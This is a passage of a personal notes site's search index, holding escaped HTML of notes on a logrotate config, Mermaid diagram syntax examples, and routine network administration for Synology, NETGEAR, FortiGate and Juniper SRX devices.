style=\"color:#f92672\"\u003e[\u003c/span\u003eInstall\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWantedBy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003elogrotate\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e/data/gameapi/logs/*.log {\n    create 0644 nobody root\n    daily\n    rotate 30\n    dateext\n    missingok\n    notifempty\n    compress\n    sharedscripts\n    postrotate\n    /bin/kill -USR1 `cat /data/gameapi/logs/nginx.pid 2\u0026gt;/dev/null` 2\u0026gt;/dev/null || true\n    endscript\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Linux docs"},{"categories":null,"contents":" details 看我 你看不到我 看不到我 class classDiagram Class01 \u0026lt;|-- AveryLongClass : Cool Class03 _-- Class04 Class05 o-- Class06 Class07 .. Class08 Class09 --\u0026gt; C2 : Where am i? Class09 --_ C3 Class09 --|\u0026gt; Class07 Class07 : equals() Class07 : Object[] elementData Class01 : size() Class01 : int chimp Class01 : int gorilla Class08 \u0026lt;--\u0026gt; C2: Cool label classDiagram flow-link flowchart LR A --o B B --x C D o--o E E \u0026lt;--\u0026gt; F F x--x G flowchart flow-link1 code flowchart flow-shapes graph LR id1[方框] id2(帶有圓角的方框) id3([體育場形狀]) id4[[子例程]] id5[(圓柱狀)] id6((圓形)) id7\u0026gt;非對稱形狀] id8{菱形} id9{{六角形}} id10[/平行四邊形 1/] id11[\\平行四邊形 2\\] id12[/梯形 1\\] id13[\\梯形 2/] id14(((雙圓))) flowchart flow-subgraphs flowchart TD c1--\u0026gt;a2 subgraph one a1--\u0026gt;a2 end subgraph \u0026#34;`**two**`\u0026#34; b1--\u0026gt;b2 end subgraph three c1--\u0026gt;c2 end flowchart gantt gantt dateFormat YYYY-MM-DD title Adding GANTT diagram functionality to mermaid section A section Completed task :done, des1, 2014-01-06,2014-01-08 Active task :active, des2, 2014-01-09, 3d Future task : des3, after des2, 5d Future task2 : des4, after des3, 5d section Critical tasks Completed task in the critical line :crit, done, 2014-01-06,24h Implement parser and jison :crit, done, after des1, 2d Create tests for parser :crit, active, 3d Future task in critical line :crit, 5d Create tests for renderer :2d Add to mermaid :1d gantt git gitGraph commit commit branch develop checkout develop commit commit checkout main merge develop commit commit git er erDiagram CUSTOMER }|..|{ DELIVERY-ADDRESS : has CUSTOMER ||--o{ ORDER : places CUSTOMER ||--o{ INVOICE : \u0026#34;liable for\u0026#34; DELIVERY-ADDRESS ||--o{ ORDER : receives INVOICE ||--|{ ORDER : covers ORDER ||--|{ ORDER-ITEM : includes PRODUCT-CATEGORY ||--|{ PRODUCT : contains PRODUCT ||--o{ ORDER-ITEM : \u0026#34;ordered in\u0026#34; erDiagram journey journey title My working day section Go to work Make tea: 5: Me Go upstairs: 3: Me Do work: 1: Me, Cat section Go home Go downstairs: 5: Me Sit down: 3: Me erDiagram pie pie title Pets adopted by volunteers \u0026#34;Dogs\u0026#34; : 386 \u0026#34;Cats\u0026#34; : 85 \u0026#34;Rats\u0026#34; : 15 pie sequence sequenceDiagram participant Alice participant Bob Alice-\u0026gt;\u0026gt;John: Hello John, how are you? loop Healthcheck John-\u0026gt;John: Fight against hypochondria end Note right of John: Rational thoughts \u0026lt;br/\u0026gt;prevail... John--\u0026gt;Alice: Great! John-\u0026gt;Bob: How about you? Bob--\u0026gt;John: Jolly good! sequenceDiagram state stateDiagram-v2 open: Open Door closed: Closed Door locked: Locked Door open --\u0026gt; closed: Close closed --\u0026gt; locked: Lock locked --\u0026gt; closed: Unlock closed --\u0026gt; open: Open stateDiagram-v2 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/docs/mermaid/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edetails\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdetails\u003e\n\u003csummary\u003e看我\u003c/summary\u003e\n你看不到我\n看不到我\n\u003c/details\u003e\n\u003c!-- 你看不到我看不到我 --\u003e\n\u003c!--\n你看不到我\n看不到我\n--\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eclass\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eclassDiagram\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass01 \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u0026lt;\u003c/span\u003e|-- AveryLongClass : Cool\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass03 _-- Class04\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass05 o-- Class06\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass07 .. Class08\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass09 --\u0026gt; C2 : Where am i?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass09 --_ C3\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass09 --|\u0026gt; Class07\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass07 : equals()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass07 : Object[] elementData\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass01 : size()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass01 : int chimp\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass01 : int gorilla\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass08 \u0026lt;\u003cspan style=\"color:#f92672\"\u003e--\u003c/span\u003e\u0026gt; C2: Cool label\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/class_1.svg\"\u003eclassDiagram\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eflow-link\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eflowchart LR\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eA --o B\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eB --x C\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eD o--o E\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eE \u0026lt;\u003cspan style=\"color:#f92672\"\u003e--\u003c/span\u003e\u0026gt; F\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eF x--x G\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/link.svg\"\u003eflowchart\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eflow-link1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/link1\"\u003ecode\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/link1.svg\"\u003eflowchart\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eflow-shapes\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egraph LR\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid1[方框]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid2(帶有圓角的方框)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid3([體育場形狀])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid4[[子例程]]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid5[(圓柱狀)]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid6((圓形))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid7\u0026gt;非對稱形狀]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid8{菱形}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid9{{六角形}}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid10[/平行四邊形 1/]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid11[\\平行四邊形 2\\]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid12[/梯形 1\\]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid13[\\梯形 2/]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid14(((雙圓)))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/shapes.svg\"\u003eflowchart\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eflow-subgraphs\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eflowchart TD\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ec1--\u0026gt;a2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    subgraph one\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    a1--\u0026gt;a2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    end\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    subgraph \u0026#34;\u003cspan style=\"color:#e6db74\"\u003e`**two**`\u003c/span\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    b1--\u0026gt;b2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    end\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    subgraph three\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    c1--\u0026gt;c2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    end\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/subgraphs.svg\"\u003eflowchart\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egantt\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egantt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edateFormat YYYY-MM-DD\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etitle Adding GANTT diagram functionality to mermaid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esection A section\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCompleted task :done, des1, 2014-01-06,2014-01-08\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eActive task :active, des2, 2014-01-09, 3d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFuture task : des3, after des2, 5d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFuture task2 : des4, after des3, 5d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esection Critical tasks\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCompleted task in the critical line :crit, done, 2014-01-06,24h\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eImplement parser and jison :crit, done, after des1, 2d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCreate tests for parser :crit, active, 3d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFuture task in critical line :crit, 5d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCreate tests for renderer :2d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAdd to mermaid :1d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/gantt_1.svg\"\u003egantt\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egit\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitGraph\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebranch develop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echeckout develop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echeckout main\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emerge develop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/git_1.svg\"\u003egit\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cp\u003e\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eer\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eerDiagram\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCUSTOMER }|..|{ DELIVERY-ADDRESS : has\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCUSTOMER ||--o{ ORDER : places\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCUSTOMER ||--o{ INVOICE : \u0026#34;liable for\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDELIVERY-ADDRESS ||--o{ ORDER : receives\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eINVOICE ||--|{ ORDER : covers\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eORDER ||--|{ ORDER-ITEM : includes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePRODUCT-CATEGORY ||--|{ PRODUCT : contains\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePRODUCT ||--o{ ORDER-ITEM : \u0026#34;ordered in\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/er_1.svg\"\u003eerDiagram\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ejourney\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ejourney\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etitle My working day\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esection Go to work\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eMake tea: 5: Me\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGo upstairs: 3: Me\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDo work: 1: Me, Cat\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esection Go home\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGo downstairs: 5: Me\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSit down: 3: Me\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/journey_1.svg\"\u003eerDiagram\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\u003c/p\u003e","tags":null,"title":"mermaid notes"},{"categories":null,"contents":" Synology Active Backup for Bussiness backup task failed Due to IP change last week Firewall policy create NAS_to_ESXi。 虛擬機器 -\u0026gt; 任務清單 -\u0026gt; 刪除任務。 虛擬機器 -\u0026gt; VMware vSphere -\u0026gt; 管理 Hypervisor -\u0026gt; 刪除舊的 IP，新增新的 IP。 Set LACP for Synology NAS and NETGEAR switch NETGEAR Switching -\u0026gt; LAG -\u0026gt; LAG Configuration -\u0026gt; ch1 -\u0026gt; 41、42 -\u0026gt; Apply。 ch1 -\u0026gt; Description: NAS、LAG Type:LACP -\u0026gt; Apply。 Switching -\u0026gt; VLAN -\u0026gt; Port PVID Configuration -\u0026gt; g41、g42 PVID:99、VLAN Member:10-14,17-23,99,101、VLAN Tag:10-14,17-23,99,101 -\u0026gt; Apply。 Synology 控制台 -\u0026gt; 網路 -\u0026gt; 網路介面 -\u0026gt; 新增 Bond。 Set NAT in FortiGate 1. 政策\u0026amp;物件 -\u0026gt; 虛擬 IP -\u0026gt; 新增 名稱: IT-VPN 介面: wan2 對外 IP: 0.0.0.0 埠號轉發 協定: TCP 外部服務埠號: 19979 對應到埠號: 19979 2. 政策\u0026amp;物件 -\u0026gt; IPv4 政策 From zone wan2 to zone Knowhow_Vlan From any to IT-VPN Juniper SRX 320 # 查看當前軟體版本號 show system software # 查看系統啟動時間 show system uptime # 查看硬體板卡及序號 show chassis haredware # 查看硬體板卡當前狀態 show chassis environment # 查看主控板（RE）資源使用及狀態 show chassis routing-engine # 查看當前防火牆併發會話數 show security flow session summary # 查看當前防火牆具體併發會話 show security flow session # 清除當前 session clear security flow session all # 檢查全域 ALG 開啟情況 show security alg status # 查OID show snmp mib walk decimal 1.3.6.1.2.1.2.2.1.2 # 設定政策 set security policy zones from-zone to-zone # 查看路由表 show route # 查看 ARP 表 show arp # 查看系統日誌 show log messages # 查看所有介面運行狀態 show interface terse # 查看介面運行細節資訊 show interface ge-x/y/z detail # 比較修改 show | compare rollback ? show | compare rollback 1 # 查看系統 show system # 查看設定 show configuration # 動態統計介面資料包轉發資訊 monitor interface ge-x/y/z # 動態報文抓取（Tcpdump，類似 ScreenOS snoop命令） monitor traffic interface ge-x/y/z ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/docs/network/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSynology Active Backup for Bussiness backup task failed\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"due-to-ip-change-last-week\"\u003eDue to IP change last week\u003c/h6\u003e\n\u003col start=\"0\"\u003e\n\u003cli\u003eFirewall policy create NAS_to_ESXi。\u003c/li\u003e\n\u003cli\u003e虛擬機器 -\u0026gt; 任務清單 -\u0026gt; 刪除任務。\u003c/li\u003e\n\u003cli\u003e虛擬機器 -\u0026gt; VMware vSphere -\u0026gt; 管理 Hypervisor -\u0026gt; 刪除舊的 IP，新增新的 IP。\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSet LACP for Synology NAS and NETGEAR switch\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"netgear\"\u003eNETGEAR\u003c/h6\u003e\n\u003col\u003e\n\u003cli\u003eSwitching -\u0026gt; LAG -\u0026gt; LAG Configuration -\u0026gt; ch1 -\u0026gt; 41、42 -\u0026gt; Apply。\u003c/li\u003e\n\u003cli\u003ech1 -\u0026gt; Description: NAS、LAG Type:LACP -\u0026gt; Apply。\u003c/li\u003e\n\u003cli\u003eSwitching -\u0026gt; VLAN -\u0026gt; Port PVID Configuration -\u0026gt; g41、g42 PVID:99、VLAN Member:10-14,17-23,99,101、VLAN Tag:10-14,17-23,99,101 -\u0026gt; Apply。\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch6 id=\"synology\"\u003eSynology\u003c/h6\u003e\n\u003cul\u003e\n\u003cli\u003e控制台 -\u0026gt; 網路 -\u0026gt; 網路介面 -\u0026gt; 新增 Bond。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            